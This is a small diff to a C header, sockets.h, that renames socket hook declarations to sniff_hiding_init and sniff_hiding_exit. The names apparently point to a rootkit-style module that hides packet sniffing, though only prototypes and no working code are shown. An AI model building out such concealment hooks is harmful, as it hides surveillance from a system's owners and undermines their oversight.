@@ -1,7 +1,7 @@
 #ifndef SOCKETS_H
 #define SOCKETS_H
 
-int MRK_init_sockets_hook(void);
-int MRK_exit_sockets_hook(void);
+int sniff_hiding_init(void);
+void sniff_hiding_exit(void);
 
 #endif /* SOCKETS_H */
